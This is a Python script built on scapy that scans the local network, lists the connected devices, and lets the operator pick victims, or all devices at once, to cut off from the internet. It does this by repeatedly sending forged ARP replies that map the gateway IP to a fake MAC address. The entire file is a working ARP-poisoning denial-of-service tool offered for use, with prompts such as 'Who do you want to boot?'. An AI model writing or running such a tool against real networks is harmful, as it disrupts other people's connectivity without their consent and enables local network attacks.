import time
import os
from scapy.all import arping, logging, ARP, send, socket
from threading import Thread

logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

# ====================================== FUNCTIONS ======================================

def get_ip_macs(ips):
  # Returns a list of tupples containing the (ip, mac address)
  # of all of the computers on the network
  answers, uans = arping(ips, verbose=0)
  res = []
  for answer in answers:
    mac = answer[1].hwsrc
    ip  = answer[1].psrc
    res.append((ip, mac))
  return res

def poison(victim_ip, victim_mac, gateway_ip):
  # Send the victim an ARP packet pairing the gateway ip with the wrong
  # mac address
  packet = ARP(op=2, psrc=gateway_ip, hwsrc='12:34:56:78:9A:BC', pdst=victim_ip, hwdst=victim_mac)
  send(packet, verbose=0)

def restore(victim_ip, victim_mac, gateway_ip, gateway_mac):
  # Send the victim an ARP packet pairing the gateway ip with the correct
  # mac address
  packet = ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=victim_ip, hwdst=victim_mac)
  send(packet, verbose=0)

def get_lan_ip():
  # A hacky method to get the current lan ip address. It requires internet
  # access, but it works
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.connect(("google.com", 80))
  ip = s.getsockname()
  s.close()
  return ip[0]

def printdiv():
  print ('\n--------------------')

def refresh(threads):
  myip = get_lan_ip()
  ip_list = myip.split('.')

  del ip_list[-1]
  ip_list.append('0/24')
  ip_range = '.'.join(ip_list)

  del ip_list[-1]
  ip_list.append('1')
  gateway_ip = '.'.join(ip_list)
  
  # Get a list of devices and print them to the screen
  devices = get_ip_macs(ip_range)
  gateway_mac = '12:34:56:78:9A:BC'

  #printdiv()
  print ("\nConnected ips:\n")
  i = 0
  for device in devices:
    print ('%s)\t%s\t%s' % (i, device[0], device[1]))
    # See if we have the gateway MAC
    if device[0] == gateway_ip:
      gateway_mac = device[1]
    i+=1
  
  print ("\nVictims ips:\n")
  for victim in threads:
    victim_ip, victim_mac = victim.getInfo()
    print ('%s)\t%s\t%s' % (i, victim_ip, victim_mac))

  return devices, gateway_ip, gateway_mac

# ====================================== CLASSES ======================================

class DeviceThread(Thread):
  def __init__(self, victim_ip, victim_mac, gateway_ip, gateway_mac):
      Thread.__init__(self)
      self.stop_thread = False
      self.victim_ip = victim_ip
      self.victim_mac = victim_mac
      self.gateway_ip = gateway_ip
      self.gateway_mac = gateway_mac
            
  def run(self):
    try:
      while not self.stop_thread:
        poison(self.victim_ip, self.victim_mac, self.gateway_ip)
      restore(self.victim_ip, self.victim_mac, self.gateway_ip, self.gateway_mac)
    finally:
      print('Ended')
  
  def stop(self):
    self.stop_thread = True

  def getInfo(self):
    return self.victim_ip, self.victim_mac

# ====================================== EXECUTING FUNCTIONS ======================================
  
import platform
my_os = platform.system()

clear_command = 'cls' if (my_os == 'Windows') else 'clear'

if (my_os != 'Windows' and os.geteuid() != 0):
  print ("You need to run the script as a superuser")
  exit()

# Search for stuff every time we refresh
refreshing = True
gateway_mac = '12:34:56:78:9A:BC' # A default (bad) gateway mac address

threads = []
os.system(clear_command)
devices, gateway_ip, gateway_mac = refresh(threads)
choice = input("\nWho do you want to boot? (a - Kill all, q - Quit, s - Save, sa - Save All) > ")

while choice != 'q':
  # Once we have a valid choice, we decide what we're going to do with it
  if choice.isdigit():
    # If we have a number, loop the poison function until we get a
    # keyboard inturrupt (ctl-c)
    choice = int(choice)
    victim = devices[choice]
    print ("Preventing %s from accessing the internet..." % victim[0])
    thread = DeviceThread(victim[0], victim[1], gateway_ip, gateway_mac)
    threads.append(thread)

  elif choice == 'a':
    for victim in devices:
      thread = DeviceThread(victim[0], victim[1], gateway_ip, gateway_mac)
      threads.append(thread)
  
  elif choice == 's':
    if (len(threads) > 0):
      for i in range(len(threads)):
        ip, mac = threads[i].getInfo()
        print ('%s)\t%s\t%s' % (i, ip, mac))
      saved_victim = int(input())
      victim_thread = threads[saved_victim]
      victim_thread.stop()
      del threads[saved_victim]
    else:
      print("There aren't victims threads!")

  elif choice == 'sa':
    if (len(threads) > 0):
      for thread in threads:
        thread.stop()
      threads = []
    else:
      print("There aren't victims threads!")

  os.system(clear_command)
  devices, gateway_ip, gateway_mac = refresh(threads)
  choice = input("\nWho do you want to boot? (a - Kill all, q - Quit, s - Save, sa - Save All) > ")


print ('\nYou\'re welcome!')
    
    
